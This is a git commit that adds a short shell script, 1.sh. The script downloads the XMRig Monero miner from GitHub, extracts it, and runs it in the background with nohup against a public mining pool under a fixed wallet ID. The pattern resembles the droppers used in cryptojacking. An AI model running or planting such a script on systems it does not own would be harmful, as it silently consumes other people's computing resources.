2632921b1de5e6b70b70918b9adf7829e5285e78
woshimouren <525965357@qq.com>
2021-12-12 15:36:18 +0800

    Add files via upload

---
+++ 1.sh
@@ -0,0 +1,4 @@
+curl -O https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-x64.tar.gz
+tar -xzf xmrig-*
+cd xmrig-*
+nohup ./xmrig -o pool.minexmr.com:4444 -u d318aa1d2e8d7b71a63db728b43f8775a2ab667d84656a5056326276a7120808 &
